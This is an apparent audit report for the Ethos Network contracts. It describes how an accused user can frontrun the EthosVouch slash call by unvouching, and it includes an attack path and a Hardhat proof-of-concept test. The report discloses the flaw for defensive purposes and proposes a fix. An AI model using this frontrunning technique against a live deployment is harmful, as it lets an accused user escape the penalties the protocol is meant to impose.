# Slashing mechanism can be frontrun by the accused to avoid paying fines in current implementation

### Summary

The current implementation of the slashing function [`EthosVouch::slash`](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/EthosVouch.sol#L520) does not take into consideration archived vouches.


```javascript


function slash(
   uint256 authorProfileId,
   uint256 slashBasisPoints
 ) external onlySlasher whenNotPaused nonReentrant returns (uint256) {
   if (slashBasisPoints > MAX_SLASH_PERCENTAGE) {
       revert InvalidSlashPercentage();
   }


   uint256 totalSlashed;
   uint256[] storage vouchIds = vouchIdsByAuthor[authorProfileId];


   for (uint256 i = 0; i < vouchIds.length; i++) {
       Vouch storage vouch = vouches[vouchIds[i]];
       // Only slash active vouches
@>>     if (!vouch.archived) {
       uint256 slashAmount = vouch.balance.mulDiv(
           slashBasisPoints,
           BASIS_POINT_SCALE,
           Math.Rounding.Floor
       );
       if (slashAmount > 0) {
           vouch.balance -= slashAmount;
           totalSlashed += slashAmount;
       }
       }
   }


   if (totalSlashed > 0) {
       // Send slashed funds to protocol fee address
       (bool success, ) = protocolFeeAddress.call{ value: totalSlashed }("");
       if (!success) revert FeeTransferFailed("Slash transfer failed");
   }


   emit Slashed(authorProfileId, slashBasisPoints, totalSlashed);
   return totalSlashed;
}


```


Such a verification is correct. However, the accused can observe any slashing call, and frontrun it if it contains his profileId. As a result, he can avoid the fines imposed by the protocol.


### Root Cause

The protocol [documentation](https://whitepaper.ethos.network/ethos-mechanisms/slash) mentioned that any accused will see their staking (and withdrawals) blocked for 24h. However, this is not yet taken into account in the current implementation. The accused can unvouch all of his vouches and withdraw most of his funds before the slashing is called.


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Attacker observes the slashing function call on his profile Id
2. Frontrun it to unvouch all current vouches, hence, avoid to pay fines



### Impact

The slashing mechanism at this state is not efficient, any accused can escape from it.


### PoC

- This test case can be appended to the suite `describe('EthosVouch Slashing'` in the file `vouch.slash.test.ts`:


```javascript


it('should be able to escape slashing', async () => {
   const slashPercentage = 1000n; // 10%
   const userC = await deployer.createUser();
   const userD = await deployer.createUser();
   const userE = await deployer.createUser();


   // userE vouches multiple profiles
   const vouchIdC = (await userE.vouch(userC)).vouchId;
   const vouchIdD = (await userE.vouch(userD)).vouchId;
  
   // userE sees the slashing call on his profileId and frontrun it by unvouching his vouches
   await userE.unvouch(vouchIdC);
   await userE.unvouch(vouchIdD);


   // Slashing is finally called
   expect(await ethosVouch.connect(slasher.signer).slash(userE.profileId, slashPercentage)).to.emit(ethosVouch, 'Slashed')
   .withArgs(userE.profileId, slashPercentage, 0);
 });


```


- Then, run it with the command `NODE_OPTIONS='--no-warnings=ExperimentalWarning --experimental-loader ts-node/esm/transpile-only' npx hardhat test --grep "escape"`, which will return the following output:


```text


EthosVouch Slashing
   âœ” should be able to escape slashing




 1 passing (1s)


```

### Mitigation

The protocol is recommended to implement the accusation process as mentioned in the [white paper](https://whitepaper.ethos.network/ethos-mechanisms/slash). It's utmost important to block the accused from withdrawing his funds before the accusation is settled.
